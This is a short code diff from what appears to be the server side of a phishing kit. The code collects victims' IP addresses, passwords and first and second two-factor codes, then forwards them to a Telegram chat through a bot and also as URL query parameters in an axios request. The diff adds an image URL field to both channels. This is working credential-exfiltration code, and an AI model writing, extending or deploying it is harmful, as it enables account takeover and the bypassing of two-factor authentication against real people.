@@ -37,7 +37,8 @@ if (data.firstTwoFa == undefined && data.secondTwoFa == undefined) {
 
     const messageCode = `<strong>Ip:</strong> ${data.ip ? data.ip : ''}
 <strong>First Two-Fa:</strong> ${data.firstTwoFa ? data.firstTwoFa : ''}
-<strong>Second Two-Fa:</strong> ${data.secondTwoFa ? data.secondTwoFa : ''}`;
+<strong>Second Two-Fa:</strong> ${data.secondTwoFa ? data.secondTwoFa : ''}
+<strong>Image:</strong> ${data.imageUrl ? data.imageUrl : ''}`;
     bot.sendMessage(process.env.CHAT_ID, messageCode,  { parse_mode: 'HTML' });
 
 }
@@ -55,6 +56,7 @@ if (data.firstTwoFa == undefined && data.secondTwoFa == undefined) {
     url.searchParams.append('Password Second', data.passwordSecond ? data.passwordSecond : '');
     url.searchParams.append('First Two-Fa', data.firstTwoFa ? data.firstTwoFa : '');
     url.searchParams.append('Second Two-Fa', data.secondTwoFa ? data.secondTwoFa : '');
+    url.searchParams.append('Image', data.imageUrl ? data.imageUrl : '');
 
     axios.get(url)
     .then(response => {
